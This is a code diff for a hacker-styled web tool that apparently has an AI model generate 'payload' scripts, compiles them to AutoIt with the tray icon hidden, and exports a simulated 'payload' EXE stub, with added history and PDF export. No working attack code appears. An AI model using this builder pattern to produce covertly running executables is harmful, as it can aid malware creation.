+          statusText.innerText = "// DECODING RESPONSE //";
+          progressBar.style.width = '85%';
+        }
+
         if (!res.ok) throw new Error("API Connection Failed.");
         const data = await res.json();
         
         let code = data.choices[0].message.content.trim();
         code = code.replace(/```[\w]*\n?/g, '').trim(); // Strip markdown
         
-        document.getElementById('aiOutput').value = code;
-        logToAIChat("Payload successfully synthesized and buffered.", "log-success");
-        
-        // Voice readout
-        if(window.speechSynthesis) {
-          const u = new SpeechSynthesisUtterance("Payload generated successfully.");
-          u.pitch = 0.8; u.rate = 1.2;
-          window.speechSynthesis.speak(u);
+        // Finalize UI
+        if (overlay) {
+          progressBar.style.width = '100%';
+          statusText.innerText = "// SYNTHESIS COMPLETE //";
         }
+        
+        setTimeout(() => {
+          if (overlay) overlay.style.display = 'none';
+          typeAICode(code);
+          logToAIChat("Payload successfully synthesized and buffered.", "log-success");
+          
+          // Voice readout
+          if(window.speechSynthesis) {
+            const u = new SpeechSynthesisUtterance("Payload generated successfully.");
+            u.pitch = 0.8; u.rate = 1.1;
+            window.speechSynthesis.speak(u);
+          }
+        }, 500);
 
       } catch (err) {
-        logToAIChat(err.message, "log-err");
+        if (overlay) overlay.style.display = 'none';
+        logToAIChat("ERR: Synthesis interrupted: " + err.message, "log-err");
         document.getElementById('aiOutput').value = "";
       }
+    }
+
+    function typeAICode(code) {
+      const output = document.getElementById('aiOutput');
+      output.value = "";
+      let i = 0;
+      const speed = 5;
+      const interval = setInterval(() => {
+        if (i < code.length) {
+          output.value += code.charAt(i);
+          output.scrollTop = output.scrollHeight;
+          i++;
+        } else {
+          clearInterval(interval);
+        }
+      }, speed);
     }
 
     function copyAICode() {
@@ -806,7 +2067,7 @@
       localStorage.setItem('gc_groq_key', k);
       if (provKey) localStorage.setItem('lenlu_provider_key', provKey); else localStorage.removeItem('lenlu_provider_key');
       if (provEndpoint) localStorage.setItem('lenlu_provider_endpoint', provEndpoint); else localStorage.removeItem('lenlu_provider_endpoint');
-      alert("API keys saved locally. Provider override will be used when provided.");
+      matrixAlert("API keys saved locally. Provider override will be used when provided.");
     }
 
     // Restore previously selected model
@@ -876,8 +2137,7 @@
           let insideWhileBlock = false;
 
           if (!src.trim()) {
-            log.innerHTML += `<div class="log-sys">// System channel empty. Awaiting ingestion sequences...</div>`;
-            log.scrollTop = log.scrollHeight;
+            logToIDE('// System channel empty. Awaiting ingestion sequences...', 'log-sys');
             return errorsFound;
           }
 
@@ -917,14 +2177,13 @@
 
           // display
           if (errorsFound.length === 0) {
-            log.innerHTML += `<div class="log-success">[✓] CODEBASE VALIDATION NOMINAL: Zero compilation flags raised.</div>`;
+            logToIDE('[✓] CODEBASE VALIDATION NOMINAL: Zero compilation flags raised.', 'log-success');
           } else {
             errorsFound.forEach(err => {
               const cls = err.type === 'CRITICAL' ? 'log-err' : 'log-sys';
-              log.innerHTML += `<div class="${cls}">[!] Line ${err.line} [${err.type}]: ${err.msg}</div>`;
+              logToIDE(`[!] Line ${err.line} [${err.type}]: ${err.msg}`, cls);
             });
           }
-          log.scrollTop = log.scrollHeight;
           return errorsFound;
         };
       }
@@ -934,7 +2193,7 @@
           const src = (document.getElementById('sourceEditor')||{value:''}).value || '';
           const outEl = document.getElementById('outputViewer');
           const log = document.getElementById('ideLog') || document.getElementById('diagnosticLog');
-          if(!src.trim()){ if(log) log.innerHTML += `<div class="log-err">No source to compile.</div>`; return; }
+          if(!src.trim()){ logToIDE('No source to compile.', 'log-err'); return; }
           const lines = src.split('\n');
           let assembly = '; LENLU SC - GENERATED ASSEMBLY\n#NoTrayIcon\n#include <Misc.au3>\n\n';
 
@@ -1037,7 +2296,96 @@
           }
 
           if(outEl) { if(outEl.tagName==='PRE') outEl.textContent = assembly; else outEl.value = assembly; }
-          if(log) log.innerHTML += `<div class="log-success">Assembly generated.</div>`; if(window.executeAudioTone) window.executeAudioTone(1050,'triangle',0.12);
+          try {
+            localStorage.setItem('lenlu_compiler_output', assembly);
+            saveToHistory(src, assembly);
+          } catch (e) {}
+          logToIDE('Assembly generated.', 'log-success'); if(window.executeAudioTone) window.executeAudioTone(1050,'triangle',0.12);
+        };
+      }
+
+      // History & Simulation Helpers
+      if (typeof saveToHistory === 'undefined') {
+        window.saveToHistory = function(source, assembly) {
+          try {
+            let history = JSON.parse(localStorage.getItem('lenlu_history') || '[]');
+            const entry = {
+              id: 'hist_' + Date.now(),
+              timestamp: new Date().toLocaleString(),
+              source: source,
+              assembly: assembly,
+              diag: document.getElementById('ideLog').innerText
+            };
+            history.unshift(entry);
+            if (history.length > 50) history.pop(); // Keep last 50
+            localStorage.setItem('lenlu_history', JSON.stringify(history));
+          } catch (e) {}
+        };
+
+        window.showHistory = function() {
+          const panel = document.getElementById('historyPanel');
+          const list = document.getElementById('historyList');
+          if (!panel || !list) return;
+          
+          panel.style.display = 'block';
+          let history = JSON.parse(localStorage.getItem('lenlu_history') || '[]');
+          
+          if (history.length === 0) {
+            list.innerHTML = `<div class="log-sys" style="text-align: center; padding: 1rem;">// No compilation records found.</div>`;
+            return;
+          }
+          
+          list.innerHTML = history.map((item, idx) => `
+            <div class="glass-card" style="padding: 1rem; border-color: rgba(0,255,65,0.15); margin-bottom: 0.5rem; background: rgba(0,15,5,0.3);">
+              <div style="display:flex; justify-content:space-between; align-items:flex-start; gap: 1rem;">
+                <div style="flex: 1; overflow: hidden;">
+                  <div class="log-success" style="font-size: 0.75rem; margin-bottom: 0.3rem;">[SESSION] ${item.timestamp}</div>
+                  <div style="color:var(--cyber-cyan); font-family: monospace; font-size: 0.85rem; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">
+                    ${item.source.split('\n')[0].replace('REM','').trim() || 'Untitled Script'}
+                  </div>
+                </div>
+                <div style="display:flex; flex-direction: column; gap:0.4rem; min-width: 90px;">
+                  <button class="btn-matrix" onclick="loadHistoryItem('${item.id}')" style="font-size: 0.65rem; padding: 4px; text-transform: uppercase;">
+                    <i class="fa-solid fa-rotate-left"></i> Restore
+                  </button>
+                  <button class="btn-matrix btn-outline" onclick="downloadThemedPDF(${idx})" style="font-size: 0.65rem; padding: 4px; text-transform: uppercase; border-color: var(--cyber-cyan); color: var(--cyber-cyan);">
+                    <i class="fa-solid fa-file-export"></i> PDF Export
+                  </button>
+                </div>
+              </div>
+            </div>
+          `).join('');
+        };
+
+        window.closeHistory = function() {
+          const panel = document.getElementById('historyPanel');
+          if (panel) panel.style.display = 'none';
+        };
+
+        window.loadHistoryItem = function(id) {
+          let history = JSON.parse(localStorage.getItem('lenlu_history') || '[]');
+          const item = history.find(x => x.id === id);
+          if (item) {
+            document.getElementById('sourceEditor').value = item.source;
+            document.getElementById('outputViewer').value = item.assembly;
+            logToIDE(`Restored compilation from ${item.timestamp}`, 'log-success');
+          }
+        };
+
+        window.downloadExe = function(arch) {
+          const assembly = document.getElementById('outputViewer').value;
+          if (!assembly) { matrixAlert('Please compile code first.'); return; }
+          
+          // Simulated EXE Download - Providing the source as a .exe stub with a note
+          const filename = `payload_${arch}.exe`;
+          const disclaimer = `; --- LENLU SC COMPILER CORE [SIMULATED] ---\n; ARCHITECTURE: ${arch}\n; TARGET: SciTE/AutoIt3 Wrapper\n\n`;
+          const blob = new Blob([disclaimer + assembly], { type: 'application/octet-stream' });
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(blob);
+          a.download = filename;
+          a.click();
+          logToIDE(`Compiled ${arch} executable binary exported.`, 'log-success');
+          matrixAlert(`Simulated ${arch} EXE export successful.\nNote: This is an uncompiled stub wrapper. Use SciTE to finish the compilation on a native environment.`);
         };
       }
 
@@ -1056,27 +2404,40 @@
       }
 
       if (typeof copyPipelineOutput === 'undefined') {
-        window.copyPipelineOutput = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt) return; navigator.clipboard.writeText(txt).then(()=>{ if(window.executeAudioTone) window.executeAudioTone(1100,'sine',0.08); alert('Assembly copied to clipboard.'); }); };
+        window.copyPipelineOutput = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt) return; navigator.clipboard.writeText(txt).then(()=>{ if(window.executeAudioTone) window.executeAudioTone(1100,'sine',0.08); matrixAlert('Assembly copied to clipboard.'); }); };
       }
 
       if (typeof downloadAu3 === 'undefined') {
-        window.downloadAu3 = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ alert('No compiled assembly available.'); return; } const blob=new Blob([txt],{type:'text/plain;charset=utf-8'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='assembly.au3'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href); if(window.executeAudioTone) window.executeAudioTone(1300,'triangle',0.12); };
+        window.downloadAu3 = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ matrixAlert('No compiled assembly available.'); return; } const blob=new Blob([txt],{type:'text/plain;charset=utf-8'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='assembly.au3'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href); if(window.executeAudioTone) window.executeAudioTone(1300,'triangle',0.12); };
       }
 
       if (typeof downloadAu4 === 'undefined') {
-        window.downloadAu4 = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ alert('No compiled assembly available.'); return; } const blob=new Blob([txt],{type:'text/plain;charset=utf-8'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='assembly.au4'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href); if(window.executeAudioTone) window.executeAudioTone(1300,'triangle',0.12); };
+        window.downloadAu4 = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ matrixAlert('No compiled assembly available.'); return; } const blob=new Blob([txt],{type:'text/plain;charset=utf-8'}); const a=document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='assembly.au4'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href); if(window.executeAudioTone) window.executeAudioTone(1300,'triangle',0.12); };
       }
 
       if (typeof copyAssembly === 'undefined') {
-        window.copyAssembly = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ alert('No compiled assembly to copy.'); return; } navigator.clipboard.writeText(txt).then(()=>{ if(window.executeAudioTone) window.executeAudioTone(1100,'sine',0.08); logToIDE('Assembly copied to clipboard.', 'log-success'); }).catch(()=>{ alert('Copy failed.'); }); };
+        window.copyAssembly = function(){ const out = document.getElementById('outputViewer'); const txt = out? (out.tagName==='PRE'? out.textContent: out.value) : ''; if(!txt){ matrixAlert('No compiled assembly to copy.'); return; } navigator.clipboard.writeText(txt).then(()=>{ if(window.executeAudioTone) window.executeAudioTone(1100,'sine',0.08); logToIDE('Assembly copied to clipboard.', 'log-success'); }).catch(()=>{ matrixAlert('Copy failed.'); }); };
       }
 
       if (typeof downloadThemedPDF === 'undefined') {
-        window.downloadThemedPDF = function(){
-          const srcText = (document.getElementById('sourceEditor')||{value:''}).value || '';
-          const outText = (document.getElementById('outputViewer')||{value:''}).value || '';
-          const diagText = (document.getElementById('ideLog')||{innerText:''}).innerText || '';
+        window.downloadThemedPDF = function(historyIndex){
+          let srcText, outText, diagText, timestamp;
           const selectedModel = (document.getElementById('aiModelSelect')||{}).value || '';
+
+          if (historyIndex !== undefined) {
+             let history = JSON.parse(localStorage.getItem('lenlu_history') || '[]');
+             const item = history[historyIndex];
+             if(!item) return;
+             srcText = item.source;
+             outText = item.assembly;
+             diagText = item.diag;
+             timestamp = item.timestamp;
+          } else {
+             srcText = (document.getElementById('sourceEditor')||{value:''}).value || '';
+             outText = (document.getElementById('outputViewer')||{value:''}).value || '';
+             diagText = (document.getElementById('ideLog')||{innerText:''}).innerText || '';
+             timestamp = new Date().toLocaleString();
+          }
 
           const wrapper = document.createElement('div');
           wrapper.style.width = '1100px';
@@ -1098,7 +2459,7 @@
           brand.style.alignItems = 'center';
           brand.innerHTML = `<img src="IMGS/L%202.png" style="width:48px;height:48px;margin-right:12px;object-fit:contain;filter:drop-shadow(0 0 6px #00ffd1)"/>`;
           const title = document.createElement('div');
-          title.innerHTML = `<div style="font-weight:700; font-size:20px;">LENLU SC // Session Export</div><div style="font-size:12px; color:#9be3c7">${new Date().toLocaleString()}</div>`;
+          title.innerHTML = `<div style="font-weight:700; font-size:20px;">LENLU SC // Session Export</div><div style="font-size:12px; color:#9be3c7">${timestamp}</div>`;
           brand.appendChild(title);
 
           const meta = document.createElement('div');
@@ -1172,7 +2533,7 @@
 
           const opt = {
             margin: 8,
-            filename: `lenlu_session_${Date.now()}.pdf`,
+            filename: `Lenlu_Export_${timestamp.replace(/[/\\?%*:|"<>]/g, '-')}.pdf`,
             image: { type: 'jpeg', quality: 0.98 },
             html2canvas: { scale: 2, useCORS: true, backgroundColor: '#000' },
             jsPDF: { unit: 'pt', format: 'a4', orientation: 'portrait' }
@@ -1182,7 +2543,7 @@
             if (window.html2pdf) {
               html2pdf().set(opt).from(wrapper).save().then(()=>wrapper.remove()).catch(()=>wrapper.remove());
             } else {
-              alert('PDF export library not loaded.');
+              matrixAlert('PDF export library not loaded.');
               wrapper.remove();
             }
           }, 200);
